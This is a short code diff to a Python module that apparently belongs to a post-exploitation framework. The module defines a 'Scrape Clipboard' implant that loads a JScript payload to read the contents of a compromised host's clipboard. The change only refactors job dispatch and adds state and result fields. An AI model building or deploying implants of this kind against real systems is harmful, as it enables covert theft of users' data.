@@ -9,17 +9,22 @@ class ClipboardJob(core.job.Job):
     def display(self):
         self.shell.print_plain("Clipboard contents:")
         self.shell.print_plain(self.data)
+        self.results = self.data
 
 class ClipboardImplant(core.implant.Implant):
 
     NAME = "Scrape Clipboard"
     DESCRIPTION = "Gets the contents of the clipboard"
     AUTHORS = ["RiskSense, Inc."]
+    STATE = "implant/gather/clipboard"
 
     def load(self):
         pass
 
+    def job(self):
+        return ClipboardJob
+
     def run(self):
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/gather/clipboard.js", self.options)
-        self.dispatch(payloads, ClipboardJob)
+        self.dispatch(payloads, self.job)
